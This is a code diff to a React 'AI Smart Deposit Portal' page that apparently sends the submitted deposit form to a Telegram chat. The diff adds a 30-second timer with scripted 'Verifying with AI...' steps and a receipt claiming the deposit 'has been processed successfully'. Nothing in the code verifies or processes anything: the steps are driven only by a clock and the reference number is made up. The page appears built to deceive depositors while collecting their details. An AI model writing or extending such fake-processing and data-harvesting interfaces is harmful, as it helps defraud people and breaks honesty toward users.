@@ -7,9 +7,14 @@ interface TelegramConfig {
   chatId: string
 }
 
+const PROCESSING_SECONDS = 30
+
 export default function DepositPortal() {
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [submitSuccess, setSubmitSuccess] = useState(false)
+  const [processingSecondsLeft, setProcessingSecondsLeft] = useState(PROCESSING_SECONDS)
+  const [processingStep, setProcessingStep] = useState(0)
+  const [receiptReference, setReceiptReference] = useState('')
 
   const [formData, setFormData] = useState({
     fullName: '',
@@ -112,7 +117,22 @@ export default function DepositPortal() {
     e.preventDefault()
     if (!isFormValid()) return
     setIsSubmitting(true)
+    setProcessingSecondsLeft(PROCESSING_SECONDS)
+    setProcessingStep(0)
     await sendToTelegram()
+    setProcessingStep(1)
+    const start = Date.now()
+    const end = start + PROCESSING_SECONDS * 1000
+    const stepInterval = (PROCESSING_SECONDS * 1000) / 3
+    const timer = setInterval(() => {
+      const left = Math.max(0, Math.ceil((end - Date.now()) / 1000))
+      setProcessingSecondsLeft(left)
+      if (left <= 20) setProcessingStep(2)
+      if (left <= 10) setProcessingStep(3)
+    }, 500)
+    await new Promise((resolve) => setTimeout(resolve, PROCESSING_SECONDS * 1000))
+    clearInterval(timer)
+    setReceiptReference('DEP-' + Date.now().toString().slice(-10))
     setSubmitSuccess(true)
     setIsSubmitting(false)
   }
@@ -136,7 +156,6 @@ export default function DepositPortal() {
   }
 
   if (submitSuccess) {
-    const referenceNumber = 'DEP-' + Date.now().toString().slice(-10)
     return (
       <>
         <header className="header">
@@ -145,14 +164,23 @@ export default function DepositPortal() {
           </div>
         </header>
         <main className="main-container">
-          <div className="deposit-card">
+          <div className="deposit-card receipt-card">
             <div className="success-content">
+              <h2 className="receipt-title">Receipt</h2>
               <div className="success-icon">✓</div>
-              <h2 className="success-title">Deposit Submitted</h2>
               <p className="success-text">
-                Your deposit request has been received and is being processed.
+                Your deposit has been processed successfully.
               </p>
-              <p className="success-reference">Reference: {referenceNumber}</p>
+              <div className="receipt-details">
+                <p className="success-reference">Reference: {receiptReference}</p>
+                <p className="receipt-amount">
+                  Amount: {formData.currency === 'USD' ? '$' : formData.currency === 'EUR' ? '€' : '£'}
+                  {formData.amount} {formData.currency}
+                </p>
+                <p className="receipt-date">
+                  Date: {new Date().toLocaleString()}
+                </p>
+              </div>
               <button
                 type="button"
                 className="submit-button"
@@ -160,6 +188,39 @@ export default function DepositPortal() {
               >
                 New Deposit
               </button>
+            </div>
+          </div>
+        </main>
+      </>
+    )
+  }
+
+  if (isSubmitting) {
+    const steps = ['Submitting deposit...', 'Verifying with AI...', 'Finalizing transaction...']
+    return (
+      <>
+        <header className="header">
+          <div className="header-brand">
+            <span className="header-title">AI Smart Deposit Portal</span>
+          </div>
+        </header>
+        <main className="main-container">
+          <div className="deposit-card processing-card">
+            <div className="processing-content">
+              <h2 className="processing-title">Processing your deposit</h2>
+              <div className="processing-spinner" aria-hidden />
+              <p className="processing-step">{steps[processingStep] ?? steps[2]}</p>
+              <p className="processing-countdown">
+                Estimated time remaining: <strong>{processingSecondsLeft}</strong> seconds
+              </p>
+              <div className="processing-progress">
+                <div
+                  className="processing-progress-bar"
+                  style={{
+                    width: `${((PROCESSING_SECONDS - processingSecondsLeft) / PROCESSING_SECONDS) * 100}%`,
+                  }}
+                />
+              </div>
             </div>
           </div>
         </main>
